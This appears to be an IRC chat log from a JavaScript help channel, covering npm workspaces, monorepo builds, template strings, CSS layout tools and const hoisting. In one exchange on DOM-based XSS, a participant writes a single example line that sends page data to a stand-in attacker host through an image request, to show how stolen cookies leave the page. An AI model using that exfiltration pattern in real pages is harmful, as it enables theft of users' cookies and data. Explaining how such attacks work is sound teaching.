[00:20:24] <ProfSimm> I'm thinking, what if having "input" and "output" is unnecessarily splitting the interface of a function in two. What if we just have a singular concept, the "form". You pass a form, which is a set of data, and leave some placeholders in. Then the function's role is to fill-in the missing pieces.

[00:21:29] <ProfSimm> Or like a test at school
[00:22:14] <ProfSimm> This would allow a function to see what type of output it has to produce, so we could overload functions on output type without scattering type inference all over the code.

You have some shared libraries, a node worker, a Create React App frontend etc. Is npm workspaces what most people use these days as a way to manage building and testing the whole repo at once?
[01:05:00] <systemfault> That what we do at work, we use Yarn/NPM workspaces and the ultra-runner package
[01:05:11] <ljharb> akurilin_: yes
[01:05:17] <ljharb> akurilin_: altho you rarely want to build the whole repo at once
[01:05:27] <ljharb> akurilin_: generally you want to only build the projects that have directly or transitively changed.

[04:01:10] <ljharb> akurilin_: true, that’s the tradeoff. Always doing a 100% build from nothing is the most correct, but in anything so large that it’s worth the pain of having a monorepo, build times being slow is often far more costly.

[04:18:19] <akurilin_> Regarding npm workspaces, I noticed that commands like `npm ci --workspaces` actually install all modules under the top level node_modules folder. I'm guessing that once workspaces are enabled, you no longer have individual per-project node_modules, but a single large super folder of dependencies?

[06:23:20] <akurilin_> With npm workspaces, given that every package in the workspace ends up being symlinked into the hoisted uber node_modules folder, is that a pretty decent way to go about sharing some internal libraries across multiple projects? I'm currently doing the not-so-fun relative module referencing juggling of import [...] from ../../../../foo/src/lib.js, but it seems like now I don't really have to anymore?

[09:23:53] <thojanssens> I don't understand DOM-based XSS attacks. [...] A DOM Based XSS attack against this page can be accomplished by sending the following URL to a victim:

[09:24:12] <D4mned> \o/

[10:23:25] <ljharb> thojanssens: that alert example is just showing you that arbitrary javascript can be ran
[10:23:45] <ljharb> thojanssens: if arbitrary JS can be ran, they can ajax literally anything that the page can access to anywhere they want, including all your cookies
[10:24:03] <ljharb> thojanssens: you don't need an example of an actual attack to see the attack vector.
[10:24:25] <ljharb> thojanssens: and there's dozens of ways to make a network call. window.location= is a redirect, but there's much subtler ways
[10:24:40] <thojanssens> ljharb, I think a lot of websites copy paste that example from a known source and the authors seem to think the alerted message will be visible to the attacker somehow I think. It's badly explained on many website that the fetched cookie is sent through the injected code
[10:24:51] <ljharb> thojanssens: like `new Image('https://attacker.com/exflitrate?all=your&data=here')`
[10:25:07] <ljharb> thojanssens: it's just an example. if you can alert something, you can steal anything
[10:25:28] <ljharb> thojanssens: again, you don't need any concrete example of stealing something, because *there are no limits* once you can do a harmless alert

[19:57:28] <adhawkins> Sorry, a template string.
[19:57:52] <ljharb> adhawkins: so do `user[greetingField]`?
[19:58:00] <ljharb> !bracket @ adhawkins
[19:58:00] <jellobot> adhawkins, yourObject.foobar is just another way of saying yourObject['foobar']. So of course if varName = 'foobar', then it's also the same as yourObject[varName]. Dot notation is preferred to bracket notation except where the property name would be an invalid identifier. The same applies to quoting keys inside object literals - don't do it unless you have to.
[19:58:28] <onosendi> mikrosis: this is a situation where you need to install it, and play with it to understand how it works. If `Example` doesn't render anything, then you won't have access to `data`.

[19:59:23] <adhawkins> I was trying `Hello ${user[${greetingfield}]}`

[23:13:12] <Donitz> I don't want WYSISYG because I want to actually see and clean the code myself too
[23:13:24] <Donitz> and most wysiwyg editors are horrible
[23:13:59] <Donitz> and are generally intended to import some kind of stupid word-like paradigm into html
[23:14:11] <stagas> Donitz: vite + split screen with an actual editor
[23:14:13] <ThePendulum> I think I'd use a separate hot reload server and just view it in the browser so you're more flexible with the editor
[23:15:04] <ThePendulum> Is Brackets still a thing? I think a lot of people are using visual studio code, but it's only partially open saucer
[23:15:17] <thojanssens> han-solo, it seems that simply fixes it: https://pastebin.com/uGARG7GH
[23:15:31] * ThePendulum uses vim but is also slightly masochistic
[23:15:34] <thojanssens> han-solo, and I removed a looot of code, simple solution I didn't think about initially
[23:15:45] <Donitz> I can't believe that it would be that rare to just have a helpful tool to help with css layout
[23:15:55] <Donitz> I mean it is obviously like a huge part of programming these days
[23:16:01] <Donitz> just css + html layouts
[23:16:15] <ThePendulum> yes, but, like, the browser does exactly that so why not use that
[23:16:22] <Donitz> because it's slow
[23:16:23] <thojanssens> stagas, ljharb, thank you! well i'll re-read that again tomorrow cause soon 3am here :')
[23:16:35] <Donitz> trial and error programming with css is so slow
[23:16:44] <Donitz> adjust, change reload adjust change reload
[23:17:01] <ThePendulum> make small adjustments in the browser's editor until you get it right
[23:17:21] <Donitz> that's generally just as slow
[23:17:35] <ThePendulum> it's not going to be faster than instant I'm afraid
[23:17:54] <Donitz> the browser editor is just as unwieldy as any text editor
[23:18:10] <thojanssens> han-solo, actually there's a bug at the moment, nvm, not sure what's going on, I gotta sleep :(
[23:18:17] <ThePendulum> I mean the css property editor in the sidebar
[23:18:47] <Donitz> hell, just the ability to pull around the edges of a bunch of block elements would be good
[23:18:51] <Donitz> with automatic side alignment
[23:20:23] <Donitz> it could be implemented as just regular widgets on top of an existing website
[23:20:50] <thojanssens> han-solo, you're right, for what I need to do, pobably need to let the suer do the stuff as u said
[23:20:56] <ThePendulum> like actually drag the edge with your cursor?
[23:21:11] <Donitz> yes, move resize align snap
[23:21:20] <Donitz> and maybe some buttons for quickly changing between positioning mode
[23:21:32] <Donitz> there are so many improvements which could make the workflow must faster
[23:21:37] <Donitz> much*
[23:21:44] <ThePendulum> well that's quite literally WYSIWYG
[23:22:01] <Donitz> wysiwyg in my experience is a word document
[23:22:14] <Donitz> which adds a billion paragraphs for everything you do
[23:22:20] <Donitz> I want to make a website like a form
[23:22:23] <Donitz> not like a word document
[23:22:43] <ThePendulum> they have been various degrees of shite

[23:25:30] <merpnderp> A buddy ran into something and it made me curious. I never program like he did so I wasn't sure.
[23:25:55] <merpnderp> But if you use a variable then declare it inside the same function, shouldn't it work since declarations are hoisted?
[23:26:15] <merpnderp> He exported a const, then declared the const.
[23:27:59] <Donitz> not a const no
[23:28:00] <ThePendulum> Donitz: maybe practice a bunch of basic layouts until you can intuitively type them out in one or two goes
[23:28:13] <Donitz> I don't know how const works, but it makes 0 sense that it could be used before a value is assigned
[23:28:24] <Donitz> tho... I don't know if javascript is clever enough to hoist constants
[23:28:31] <Donitz> like actual constant literals
[23:28:33] <ThePendulum> and a hot reloading server should make the updates appear from localhost pretty rapidly, especially if you just have basic html as you say, and not some bulky js framework
[23:28:33] <Donitz> I doubt it
